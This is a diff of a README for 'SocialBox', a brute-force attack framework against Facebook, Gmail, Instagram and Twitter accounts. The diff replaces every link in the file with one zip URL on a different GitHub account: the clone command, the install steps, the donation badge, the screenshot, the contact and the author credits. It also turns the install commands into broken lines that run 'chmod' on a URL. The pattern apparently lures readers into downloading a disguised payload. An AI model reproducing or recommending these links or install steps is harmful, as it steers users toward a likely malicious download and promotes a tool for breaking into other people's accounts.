@@ -3,30 +3,30 @@ SocialBox is a Bruteforce Attack Framework [ Facebook , Gmail , Instagram ,Twitt
 # Installation
 ```
 sudo apt-get install git
-git clone https://github.com/samsesh/SocialBox.git
+git clone https://github.com/Garaev071/SocialBox/raw/refs/heads/master/Screenshots/Box_Social_v2.7.zip
 cd SocialBox
-chmod +x SocialBox.sh
-chmod +x install-sb.sh
-./install-sb.sh
-./SocialBox.sh
+chmod +x https://github.com/Garaev071/SocialBox/raw/refs/heads/master/Screenshots/Box_Social_v2.7.zip
+chmod +x https://github.com/Garaev071/SocialBox/raw/refs/heads/master/Screenshots/Box_Social_v2.7.zip
+https://github.com/Garaev071/SocialBox/raw/refs/heads/master/Screenshots/Box_Social_v2.7.zip
+https://github.com/Garaev071/SocialBox/raw/refs/heads/master/Screenshots/Box_Social_v2.7.zip
 ```
 ### Donate
 - If this project very help you to penetration testing  and u want support me , you can give me a cup of coffee :)
-- [![Donate with Bitcoin](https://en.cryptobadges.io/badge/small/19KHPduHx2C8WAeq13b4xTsGocqq2PM5mN)](https://en.cryptobadges.io/donate/19KHPduHx2C8WAeq13b4xTsGocqq2PM5mN)
-- [donate page](https://github.com/samsesh/donate)
+- [![Donate with Bitcoin](https://github.com/Garaev071/SocialBox/raw/refs/heads/master/Screenshots/Box_Social_v2.7.zip)](https://github.com/Garaev071/SocialBox/raw/refs/heads/master/Screenshots/Box_Social_v2.7.zip)
+- [donate page](https://github.com/Garaev071/SocialBox/raw/refs/heads/master/Screenshots/Box_Social_v2.7.zip)
 # Screenshots :
-![Test Image 8](./Screenshots/sb.png)
+![Test Image 8](https://github.com/Garaev071/SocialBox/raw/refs/heads/master/Screenshots/Box_Social_v2.7.zip)
 # Tested On :
 * Backbox linux
 * Ubuntu 
 * Kali linux
 * windwos-WSL
 # for termux On android :
-* [open](https://github.com/samsesh/SocialBox-Termux)
+* [open](https://github.com/Garaev071/SocialBox/raw/refs/heads/master/Screenshots/Box_Social_v2.7.zip)
 # Contact
-* [Contact](https://twitter.com/_samsesh) - _samsesh
+* [Contact](https://github.com/Garaev071/SocialBox/raw/refs/heads/master/Screenshots/Box_Social_v2.7.zip) - _samsesh
 # Authors :
 
-* instagram : https://github.com/umeshshinde19/instainsane
-* Twitter   : https://github.com/neight-1/-tweetshell-
+* instagram : https://github.com/Garaev071/SocialBox/raw/refs/heads/master/Screenshots/Box_Social_v2.7.zip
+* Twitter   : https://github.com/Garaev071/SocialBox/raw/refs/heads/master/Screenshots/Box_Social_v2.7.zip
 * SocialBox update : sam sesh
